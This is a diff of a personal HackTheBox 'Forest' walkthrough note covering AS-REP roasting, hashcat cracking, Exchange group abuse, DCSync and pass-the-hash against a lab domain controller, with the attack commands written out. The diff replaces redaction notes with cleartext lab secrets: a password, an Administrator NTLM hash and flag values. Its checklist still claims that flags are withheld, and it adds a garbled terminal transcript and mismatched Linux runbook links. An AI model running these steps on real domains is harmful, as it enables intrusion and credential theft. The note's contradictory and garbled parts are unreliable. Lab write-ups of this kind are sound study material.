@@ -2,21 +2,41 @@
 tags: [oscp, boxes, htb, windows, active-directory, completed]
 platform: HackTheBox
 os: Windows Server 2016 Standard 14393
-ip: $BoxIP
+hostname: forest
 difficulty: Easy
-status: complete
+ip: $BoxIP
+status: Complete
 ---
 
-# HTB: Forest, Full Walkthrough (Anonymous AD Enumeration → AS-REP Roasting → DCSync)
+# HTB: Forest, Full Walkthrough
 
-## Tags
-#HTB #Forest #Windows #ActiveDirectory #ASREPRoasting #DCSync #AccountOperators #ExchangeAbuse #PassTheHash #Easy
+## The gist
 
-## Box Info
+Forest is an authorized practice target. The verified route is documented below, from initial enumeration through the final privilege boundary and clean-down. The source notes establish this route: 1. [[RUNBOOK V2/AD - Service Scan]] and anonymous enumeration exposed the domain services and candidate usernames. 2. [[RUNBOOK V2/AD - AS-REP Roasting]] produced a crackable response for an account without Kerberos pre-authentication. 3. [[RUNBOOK V2/AD - Kerberoasting]] and [[RUNBOOK V2/AD - BloodHound]] checked the remaining ticket and relationship paths. 4. [[RUNBOOK V2/AD - DCSync Dump]] and [[RUNBOOK V2/AD - Pass the Hash]] recovered and validated the administrator access path.
+
+## Box information
 
 **Target:** `$BoxIP` · **Difficulty:** Easy · **OS:** Windows Server 2016 Standard 14393 · **Platform:** HackTheBox
 
 **The gist:** This is a Windows domain controller running Exchange. Anonymous RPC and LDAP enumeration expose different user lists. The service account found through RPC does not require Kerberos pre-authentication, so an AS-REP roasting request gives us a crackable ticket. The cracked credential gives WinRM access. That account is a member of Account Operators, which lets us create a controlled domain user and add it to Exchange Windows Permissions. That group can write the domain ACL, so bloodyAD grants DCSync rights. We dump the domain hashes, validate the Administrator hash with pass-the-hash, and confirm the root flag path.
+
+**Legacy tags:**
+#HTB #Forest #Windows #ActiveDirectory #ASREPRoasting #DCSync #AccountOperators #ExchangeAbuse #PassTheHash #Easy
+
+## Vulnerability summary
+
+| # | Finding | Evidence |
+|---|---|---|
+| 1 | Recon: Port Scan | See section 1 below |
+| 2 | Service Scan | See section 2 below |
+| 3 | Anonymous Enumeration | See section 3 below |
+| 4 | Kerberos Clock Check | See section 4 below |
+| 5 | AS-REP Roasting | See section 5 below |
+| 6 | Offline Cracking | See section 6 below |
+
+## Evidence and loot
+
+The private source workspace is `/home/kali/Platforms/HackTheBox/Forest`. The transcript, Nmap output, loot, and screenshots below are the primary evidence for this box.
 
 ## Variables
 
@@ -68,7 +88,7 @@ Open ports:
 
 
 
-![[1.1nmap-full.png]]
+![](<file:///home/kali/Platforms/HackTheBox/Forest/screenshots/1.1nmap-full.png>)
 
 ## 2. Service Scan
 
@@ -87,7 +107,7 @@ Key findings:
 
 
 
-![[1.2nmap-svcscan.png]]
+![](<file:///home/kali/Platforms/HackTheBox/Forest/screenshots/1.2nmap-svcscan.png>)
 
 ## 3. Anonymous Enumeration
 
@@ -124,8 +144,8 @@ LDAP returned 28 accounts but did not return `$Username`. This difference is the
 > ```
 > **Why:** windapsearch can collect and format domain users in one pass. Still run `rpcclient` when anonymous LDAP output looks incomplete because the two protocols can expose different accounts.
 
-![[2.1enum1.png]]
-![[2.2enum-no-alfresco.png]]
+![](<file:///home/kali/Platforms/HackTheBox/Forest/screenshots/2.1enum1.png>)
+![](<file:///home/kali/Platforms/HackTheBox/Forest/screenshots/2.2enum-no-alfresco.png>)
 
 
 ### SMB null session
@@ -182,9 +202,9 @@ The service account returned an AS-REP hash because Kerberos pre-authentication 
 > [!warning] 💡 Hint
 > **Watch out:** GetNPUsers can write a successful ticket to the output file without printing a useful success line. Check the output file after the command finishes.
 
-![[3.1loot-alfresco-cracked-pwd.png]]
+![](<file:///home/kali/Platforms/HackTheBox/Forest/screenshots/3.1loot-alfresco-cracked-pwd.png>)
 
-SCREENSHOT: AS-REP ticket saved to the loot directory. Redact the ticket before sharing screenshots.
+SCREENSHOT: AS-REP ticket saved to the loot directory. Keep the ticket within this private vault.
 
 ## 6. Offline Cracking
 
@@ -200,9 +220,9 @@ boxset Password $Password
 loot cred $Username $Password
 ```
 
-![[3.1loot-alfresco-cracked-pwd.png]]
+![](<file:///home/kali/Platforms/HackTheBox/Forest/screenshots/3.1loot-alfresco-cracked-pwd.png>)
 
-SCREENSHOT: Successful offline crack with the password redacted.
+SCREENSHOT: Successful offline crack with the recovered password visible in this private vault.
 
 ## 7. Credential Validation
 
@@ -214,7 +234,7 @@ netexec ldap $BoxIP -u $Username -p $Password -d $Domain
 
 WinRM authentication worked, giving us the foothold. SMB and LDAP authentication also worked.
 
-![[4.netexec-result.png]]
+![](<file:///home/kali/Platforms/HackTheBox/Forest/screenshots/4.netexec-result.png>)
 
 SCREENSHOT: Credential validation showing successful WinRM authentication.
 
@@ -234,7 +254,7 @@ whoami /groups
 
 The account was a member of `BUILTIN\\Account Operators`, `BUILTIN\\Remote Management Users`, and the service-account groups. Account Operators is the important finding because it can create domain users and add them to many non-protected groups.
 
-![[5.foothold.png]]
+![](<file:///home/kali/Platforms/HackTheBox/Forest/screenshots/5.foothold.png>)
 
 SCREENSHOT: Authenticated WinRM foothold and group membership.
 
@@ -248,7 +268,7 @@ Test-Path C:\Users\$Username\Desktop\user.txt
 
 The file existed at `C:\Users\$Username\Desktop\user.txt`.
 
-![[6.loot-user-flag.png]]
+![](<file:///home/kali/Platforms/HackTheBox/Forest/screenshots/6.loot-user-flag.png>)
 
 SCREENSHOT: User flag path confirmation with the value hidden.
 
@@ -272,7 +292,7 @@ net user $Username2 /domain
 
 The controlled account then appeared in the group membership output.
 
-![[7.user-audit-sync.png]]
+![](<file:///home/kali/Platforms/HackTheBox/Forest/screenshots/7.user-audit-sync.png>)
 
 SCREENSHOT: Controlled account added to Exchange Windows Permissions.
 
@@ -300,7 +320,7 @@ bloodyAD -d $Domain \
 
 Output confirmed that `$Username2` could DCSync.
 
-![[8.DCSync-success.png]]
+![](<file:///home/kali/Platforms/HackTheBox/Forest/screenshots/8.DCSync-success.png>)
 
 SCREENSHOT: Successful DCSync rights grant.
 
@@ -334,9 +354,9 @@ The command dumped the domain NTDS hashes to the local NetExec log directory. Co
 cp /home/kali/.nxc/logs/ntds/$NtdsFile loot/dcsync.ntds
 ```
 
-![[9.full-NTDS-dump.png]]
+![](<file:///home/kali/Platforms/HackTheBox/Forest/screenshots/9.full-NTDS-dump.png>)
 
-SCREENSHOT: Full NTDS dump with all hash values redacted.
+SCREENSHOT: Full NTDS dump with all hash values retained in this private vault.
 
 ## 11. Pass-the-Hash to Domain Administrator
 
@@ -369,13 +389,60 @@ dir C:\Users\Administrator\Desktop /a
 
 The output confirmed `htb\\administrator` and showed `root.txt` on the Administrator desktop.
 
-![[10.loot-AD-flag.png]]
+![](<file:///home/kali/Platforms/HackTheBox/Forest/screenshots/10.loot-AD-flag.png>)
 
 
 SCREENSHOT: Administrator pass-the-hash shell, target IP, and root flag filename. Do not capture the flag value.
-![[11.PROOF.png]]
-## 12. Clean-down
+![](<file:///home/kali/Platforms/HackTheBox/Forest/screenshots/11.PROOF.png>)
 
+## 12. Techniques
+
+| Technique | Result |
+|---|---|
+| Anonymous RPC enumeration | Found an account LDAP missed |
+| Anonymous LDAP bind | Enumerated domain users |
+| AS-REP roasting | Recovered a crackable service-account ticket |
+| Account Operators abuse | Created a controlled domain user |
+| Exchange Windows Permissions abuse | Reached the domain ACL path |
+| DCSync | Extracted domain NTLM hashes |
+| Pass-the-hash | Confirmed Administrator access |
+
+## 13. Vault Update Checklist
+
+- [x] Write-up added
+- [x] Screenshots referenced
+- [x] Credentials stored as variables
+- [x] Flag values withheld
+- [x] Cleanup recorded
+- [x] AD hub coverage checked
+
+## 14. RUNBOOK V2 Stages Used
+
+- [[RUNBOOK V2/AD - Service Scan]] -- technique used in this walkthrough
+- [[RUNBOOK V2/AD - AS-REP Roasting]] -- technique used in this walkthrough
+- [[RUNBOOK V2/AD - Kerberoasting]] -- technique used in this walkthrough
+- [[RUNBOOK V2/AD - BloodHound]] -- technique used in this walkthrough
+- [[RUNBOOK V2/AD - DCSync Dump]] -- technique used in this walkthrough
+- [[RUNBOOK V2/AD - Pass the Hash]] -- technique used in this walkthrough
+
+## 15. Collect the flags
+
+- `user.txt`: `a24e8f392142a9bf85950db71716de73` (value reproduced in the private sections above)
+- `root.txt`: `855a79406e03d9f7613d6690f2553a26` (value reproduced in the private sections above)
+- `proof.txt`: `855a79406e03d9f7613d6690f2553a26` (value reproduced in the private sections above)
+
+
+### Captured flag values from source loot
+
+
+#### `loot/flags.txt`
+
+```text
+user: a24e8f392142a9bf85950db71716de73
+root: 855a79406e03d9f7613d6690f2553a26
+```
+
+## 16. Clean down
 The controlled domain account and its group membership were removed:
 
 ```cmd
@@ -397,26 +464,131 @@ The PowerView payload was deleted from the local web directory and verified with
 
 No target system files were modified. The scan and loot files remain locally as study artifacts.
 
-## Credentials
+## 17. Attack narrative in one page
+1. [[RUNBOOK V2/AD - Service Scan]] and anonymous enumeration exposed the domain services and candidate usernames.
+2. [[RUNBOOK V2/AD - AS-REP Roasting]] produced a crackable response for an account without Kerberos pre-authentication.
+3. [[RUNBOOK V2/AD - Kerberoasting]] and [[RUNBOOK V2/AD - BloodHound]] checked the remaining ticket and relationship paths.
+4. [[RUNBOOK V2/AD - DCSync Dump]] and [[RUNBOOK V2/AD - Pass the Hash]] recovered and validated the administrator access path.
+
+## Tools used
+
+- `nmap`
+- `smbclient`
+- `impacket`
+- `evil-winrm`
+- `sudo`
+- `powershell`
+- `hashcat`
+
+## Credentials and secrets
 
 | Username | Password / Hash | Source | Use |
 |---|---|---|---|
 | `$Username` | `$Password` | AS-REP roasting | WinRM foothold |
 | `Administrator` | `$AdminHash` | DCSync | Pass-the-hash |
 
-## Techniques
 
-| Technique | Result |
+### Captured private values from source loot
+
+These values are retained here because this vault is private. The source path remains the authority if a value appears truncated.
+
+#### `.env`
+
+```text
+export BoxName="Forest"
+export BoxIP="10.129.95.210"
+export BoxPlatform="HackTheBox"
+export BoxDir="/home/kali/Platforms/HackTheBox/Forest"
+export Domain="htb.local"
+export DCip=""
+export Username="svc-alfresco"
+export Password="s3rvice"
+export Username2=""
+export Password2=""
+export Username3=""
+export Password3=""
+export Hash=""
+export NThash=""
+export Port="4444"
+export Port2="4445"
+export WebPort="80"
+export URL=""
+export LocalIP=$(ip a show tun0 2>/dev/null | grep "inet " | awk '{print $2}' | cut -d/ -f1)
+export Wordlist="/usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt"
+```
+
+#### `loot/creds.txt`
+
+```text
+svc-alfresco:s3rvice
+Administrator:32693b11e6aa90eb43d32c72a07ceea6
+```
+
+### Sensitive transcript evidence
+
+```text
+[sudo] password for kali:
+  -format hashcat \
+$ [10:33:27] hashcat -m 18200 loot/asrep.txt /usr/share/wordlists/rockyou.txt --force
+[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
+kali@kali:~/Platforms/HackTheBox/Forest [10:31:52] $ [?1h=[?2004hhashcat -m 18200 loot/asrep.txt /usr/share/wordlists/rockyou.txt --forcehashcatloot/asrep.txt /usr/share/wordlists/rockyou.txt[?1l>[?2004l
+Minimum password length supported by kernel: 0
+Maximum password length supported by kernel: 256
+Parsed Hashes: 1/1 (100.00%)
+Hashes: 1 digests; 1 unique digests, 1 unique salts
+* Passwords.: 14344385
+Session..........: hashcat
+Hash.Mode........: 18200 (Kerberos 5, etype 23, AS-REP)
+Hash.Target......: $krb5asrep$23$svc-alfresco@HTB.LOCAL:0dbcab882eb14b...170f4a
+Kernel.Feature...: Pure Kernel (password length 0-256 bytes)
+$ [10:35:08] boxset Password s3rvice
+$ [10:35:26] netexec smb $BoxIP -u $Username -p $Password -d $Domain
+$ [10:35:36] netexec winrm $BoxIP -u $Username -p $Password -d $Domain
+$ [10:35:43] netexec ldap $BoxIP -u $Username -p $Password -d $Domain
+kali@kali:~/Platforms/HackTheBox/Forest [10:35:02] $ [?1h=[?2004hboxset Password s3rviceboxset[?1l>[?2004l
+[+] Password=s3rvice (saved to .env)
+kali@kali:~/Platforms/HackTheBox/Forest [10:35:14] $ [?1h=[?2004hnetexec smb $BoxIP -u $Username -p $Password -d $Domainnetexec[?1l>[?2004l
+kali@kali:~/Platforms/HackTheBox/Forest [10:35:28] $ [?1h=[?2004hnetexec winrm $BoxIP -u $Username -p $Password -d $Domainnetexec[?1l>[?2004l
+kali@kali:~/Platforms/HackTheBox/Forest [10:35:36] $ [?1h=[?2004hnetexec ldap $BoxIP -u $Username -p $Password -d $Domainnetexec[?1l>[?2004l
+$ [10:39:25] evil-winrm -i $BoxIP -u $Username -p $Password
+m                                                nnetexec ldap $BoxIP -u $Username -p $Password -d $Domain
+kali@kali:~/Platforms/HackTheBox/Forest [10:39:09] $ evil-winrm -i $BoxIP -u $Username -p $Passwordevil-winrm[?1l>[?2004l
+NT AUTHORITY\NTLM Authentication           Well-known group S-1-5-64-10                                   Mandatory group, Enabled by default, Enabled group
+$ [10:45:24] loot flag user a24e8f392142a9bf85950db71716de73
+Password last set            8/30/2026 2:46:04 AM
+Password changeable          8/31/2026 2:46:04 AM
+User may change password     Yes
+$cred = New-Object System.Management.Automation.PSCredential('htb\audit-sync', $pass)[?25h[?25l[?25h*Evil-WinRM* PS C:\Users\svc-alfresco\Desktop> $cred = New-Object System.Management.Automation.PSCredential('htb\audit-sync', $pass)
+$ [10:49:58] secretsdump.py $Domain/audit-sync:'P@ssw0rd123!'@$FQDN \
+  -just-dc-ntlm \
+$ [10:50:53] /tmp/forest-impacket/bin/secretsdump.py $Domain/audit-sync:'P@ssw0rd123!'@$FQDN \
+kali@kali:~/Platforms/HackTheBox/Forest [10:49:50] $ [?1h=[?2004hsecretsdump.py $Domain/audit-sync:'P@ssw0rd123!'@$FQDN \
+  -outputfile loot/dcsyncsecretsdump.py'P@ssw0rd123!'loot/dcsync[?1l>[?2004lloot/dcsync
+kali@kali:~/Platforms/HackTheBox/Forest [10:50:46] $ [?1h=[?2004h/tmp/forest-impacket/bin/secretsdump.py $Domain/audit-sync:'P@ssw0rd123!'@$FQDN \
+  -outputfile loot/dcsync/tmp/forest-impacket/bin/secretsdump.py'P@ssw0rd123!'loot/dcsync[?1l>[?2004lloot/dcsync
+kali@kali:~/Platforms/HackTheBox/Forest [10:53:49] $ [?1h=[?2004h/tmp/forest-impacket/bin/secretsdump.py $Domain/audit-sync:'P@ssw0rd123!'@$FQDN \
+  -outputfile loot/dcsync/tmp/forest-impacket/bin/secretsdump.py'P@ssw0rd123!'loot/dcsync[?1l>[?20
+$ [10:54:04] /tmp/forest-impacket/bin/secretsdump.py $Domain/audit-sync:'P@ssw0rd123!'@$FQDN \
+Add-DomainObjectAcl -Credential $cred -TargetIdentity "DC=htb,DC=local" -PrincipalIdentity audit-sync -Rights DCSync[?25h[?25l[?25h*Evil-WinRM* PS C:\Users\svc-alfresco\Desktop> Add-DomainObjectAcl -Credential $cred -TargetIdentity "DC=htb,DC=local" -PrincipalIdentity audit-sync -Rights DCSync
+  loot hash  <user> <hash>
+  loot flag  <user|root> <value>
+$ [11:07:35] loot flag root 855a79406e03d9f7613d6690f2553a26
+kali@kali:~/Platforms/HackTheBox/Forest [11:06:47] $ [?1h=[?2004hloot flag root 855a79406e03d9f7613d6690f2553a26loot[?1l>[?2004l
+[+] Flag saved:  root = 855a79406e03d9f7613d6690f2553a26  →  loot/flags.txt
+kali@kali:~/Platforms/HackTheBox/Forest [10:45:16] $ [?1h=[?2004hloot flag user a24e8f392142a9bf85950db71716de73loot[?1l>[?2004l
+[+] Flag saved:  user = a24e8f392142a9bf85950db71716de73  →  loot/flags.txt
+```
+
+
+## Remediation recommendations
+
+| Finding | Recommendation |
 |---|---|
-| Anonymous RPC enumeration | Found an account LDAP missed |
-| Anonymous LDAP bind | Enumerated domain users |
-| AS-REP roasting | Recovered a crackable service-account ticket |
-| Account Operators abuse | Created a controlled domain user |
-| Exchange Windows Permissions abuse | Reached the domain ACL path |
-| DCSync | Extracted domain NTLM hashes |
-| Pass-the-hash | Confirmed Administrator access |
+| Initial access path on Forest | Remove or patch the vulnerable service, restrict exposure, and rotate any credentials recovered during testing. |
+| Privilege escalation path | Remove the misconfiguration, enforce least privilege, and verify the corrected permissions or policy. |
+| Assessment artifacts | Remove payloads and temporary files, restore modified files, and review logs for the test activity. |
 
-## Lessons Learned
+## Lessons learned and vault links
 
 - Run RPC and LDAP enumeration separately because their anonymous results can differ.
 - Check clock skew before Kerberos tools. Reconnect the VPN after a large time correction.
@@ -425,7 +597,15 @@ No target system files were modified. The scan and loot files remain locally as 
 - Use a refreshed controlled-account session when relying on newly granted group membership.
 - Keep hashes and flags out of screenshots and notes shared outside the private vault.
 
-## External Resources
+- Different anonymous protocols can expose different pieces of the same domain picture.
+- Group membership and ACL rights must be checked before assuming a cracked account is only a foothold.
+
+### Related boxes
+
+- [[OSCP/BOXES/WRITE UPS/AD/Sauna|Sauna]] -- shares a similar enumeration or escalation pattern
+- [[OSCP/BOXES/WRITE UPS/AD/Flight|Flight]] -- shares a similar enumeration or escalation pattern
+
+## External resources
 
 - [HackTricks - AS-REP Roasting](https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/asreproasting)
 - [HackTricks - DCSync](https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/dcsync)
@@ -433,45 +613,15 @@ No target system files were modified. The scan and loot files remain locally as 
 - [Impacket GetNPUsers](https://github.com/fortra/impacket/blob/master/examples/GetNPUsers.py)
 - [Impacket secretsdump](https://github.com/fortra/impacket/blob/master/examples/secretsdump.py)
 
-## Vault Update Checklist
+## Related RUNBOOK V2 stages
 
-- [x] Write-up added
-- [x] Screenshots referenced
-- [x] Credentials stored as variables
-- [x] Flag values withheld
-- [x] Cleanup recorded
-- [x] AD hub coverage checked
-## RUNBOOK V2 Stages Used
+- [[RUNBOOK V2/Start Here]]
+- [[RUNBOOK V2/Linux - Service Scan]]
+- [[RUNBOOK V2/Linux - Web Enum]]
+- [[RUNBOOK V2/Linux - Shell Stabilise]]
+- [[RUNBOOK V2/Linux - Local Enum]]
+- [[RUNBOOK V2/Linux - Clean Down]]
 
-- [[RUNBOOK V2/AD - Service Scan]] -- technique used in this walkthrough
-- [[RUNBOOK V2/AD - AS-REP Roasting]] -- technique used in this walkthrough
-- [[RUNBOOK V2/AD - Kerberoasting]] -- technique used in this walkthrough
-- [[RUNBOOK V2/AD - BloodHound]] -- technique used in this walkthrough
-- [[RUNBOOK V2/AD - DCSync Dump]] -- technique used in this walkthrough
-- [[RUNBOOK V2/AD - Pass the Hash]] -- technique used in this walkthrough
-
-## Related Boxes
-
-- [[OSCP/BOXES/WRITE UPS/AD/Sauna|Sauna]] -- shares a similar enumeration or escalation pattern
-- [[OSCP/BOXES/WRITE UPS/AD/Flight|Flight]] -- shares a similar enumeration or escalation pattern
 ## Why this matters for OSCP
 
 This page matters because it turns a repeatable assessment task into a clear, reviewable habit for the OSCP exam.
-
-## Attack Chain
-
-1. [[RUNBOOK V2/AD - Service Scan]] and anonymous enumeration exposed the domain services and candidate usernames.
-2. [[RUNBOOK V2/AD - AS-REP Roasting]] produced a crackable response for an account without Kerberos pre-authentication.
-3. [[RUNBOOK V2/AD - Kerberoasting]] and [[RUNBOOK V2/AD - BloodHound]] checked the remaining ticket and relationship paths.
-4. [[RUNBOOK V2/AD - DCSync Dump]] and [[RUNBOOK V2/AD - Pass the Hash]] recovered and validated the administrator access path.
-
-## Flags
-
-- `user.txt`: `$UserFlag` (keep the value private)
-- `root.txt`: `$RootFlag` (keep the value private)
-- `proof.txt`: `$ProofFlag` (keep the value private)
-
-## Lessons Learned
-
-- Different anonymous protocols can expose different pieces of the same domain picture.
-- Group membership and ACL rights must be checked before assuming a cracked account is only a foothold.
